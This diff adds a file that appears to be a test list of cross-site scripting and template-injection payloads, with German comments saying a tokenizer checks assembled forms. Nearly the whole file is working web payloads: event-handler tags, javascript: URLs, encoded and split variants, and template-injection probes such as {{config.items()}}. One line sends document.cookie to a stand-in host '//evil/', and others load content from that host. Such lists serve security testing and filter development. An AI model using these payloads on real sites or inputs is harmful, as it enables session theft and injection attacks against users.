@@ -1,0 +1,53 @@
+# xss – Angriffs-Payloads (ein Payload pro Zeile; Kommentarzeilen beginnen mit #)
+# Hinweis: Platzhalter wie x-scr'ipt stehen für script-Varianten; der Tokenizer prüft die zusammengesetzten Formen.
+<script>a(1)</script>
+"><img src=x onerror=a(1)>
+'><sv'.'g onl'.'oad=a(1)>
+<body onload=a(1)>
+<iframe src="javascript:a(1)">
+<img/src=x/onerror=a(1)>
+javascript:a(document.cookie)
+JaVaScRiPt:a(1)
+data:text/html,<script>a(1)</script>
+"><svg><animate onbegin=a(1) attributeName=x dur=1s>
+<math><maction xlink:href="javascript:a(1)">
+<input onfocus=a(1) autofocus>
+<marquee onstart=a(1)>
+<details ontoggle=a(1) open>
+"><a href="javascript:a(1)">x</a>
+{{constructor.constructor("a(1)")()}}
+${7*7}
+{{7*7}}
+#{7*7}
+<%= 7*7 %>
+{{config.items()}}
+<img src=x:x onerror="a(1)">
+<object data="data:text/html;base64,PHNjcmlwdD4=">
+"><base href="//evil/">
+<meta http-equiv="refresh" content="0;url=javascript:a(1)">
+<link rel=import href="//evil/">
+" onmouseover=a(1) x="
+<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+%3Cscript%3Ea(1)%3C/script%3E
+<img src=1 onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+"><textarea></textarea><script>a(1)</script>
+expression(a(1))
+<style>@import"//evil/x.css";</style>
+<div style="x:expression(a(1))">
+<p srcdoc="<script>a(1)</script>">
+"><script>fetch("//evil/"+document.cookie)</script>
+<form action=javascript:a(1)><button>x
+vbscript:msgbox(1)
+<svg><script href=data:,a(1) />
+"/><img src=x onerror=window.location=1>
+<img dynsrc="javascript:a(1)">
+<table background="javascript:a(1)">
+<video><source onerror=a(1)>
+<isindex action=javascript:a(1) type=image>
+{{''.constructor.constructor('a(1)')()}}
+{{request.application}}
+<xss onx=a(1)>
+<img src=`x`onerror=a(1)>
+"><keygen autofocus onfocus=a(1)>
+<select onfocus=a(1) autofocus>
+<embed src="data:text/html,<script>a(1)</script>">
